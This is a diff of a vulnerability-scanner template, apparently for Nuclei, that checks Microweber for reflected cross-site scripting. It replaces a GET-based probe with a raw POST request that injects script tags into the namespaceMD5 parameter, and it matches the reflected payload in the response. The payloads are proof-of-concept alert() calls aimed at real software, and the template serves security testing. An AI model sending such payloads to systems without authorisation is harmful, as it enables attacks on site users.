@@ -2,33 +2,26 @@ id: microweber-xss
 
 info:
   name: Microweber XSS
-  author: gy741
-  severity: medium
-  description: Cross-site Scripting (XSS) - Reflected in Packagist microweber/microweber prior to 1.2.11.
-  reference:
-    - https://github.com/microweber/microweber/issues/809
-    - https://github.com/microweber/microweber
-  metadata:
-    shodan-query: 'http.favicon.hash:780351152'
-  tags: microweber,xss,oss
+  author: shelled
+  severity: low
+  tags: xss
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path='
-
+  - raw:
+      - |
+        POST /modules HTTP/1.1
+        Host: {{Hostname}}
+        
+        namespaceMD5=3389dae361af79b04c9c8e7057f60cc6test}'')"><script>alert()</script><script>alert()</script>&module=settings%2Fgroup%2Flanguage_import&id=mw_admin_import_language_modal_content
+    
+    
     matchers-condition: and
     matchers:
       - type: word
-        part: body
-        words:
-          - '<script>alert(document.domain)</script>" 0="filetype=images"'
-
-      - type: word
         part: header
         words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
+          - "text/html"
+          
+      - type: word
+        words:
+          - "<script>alert()</script>"
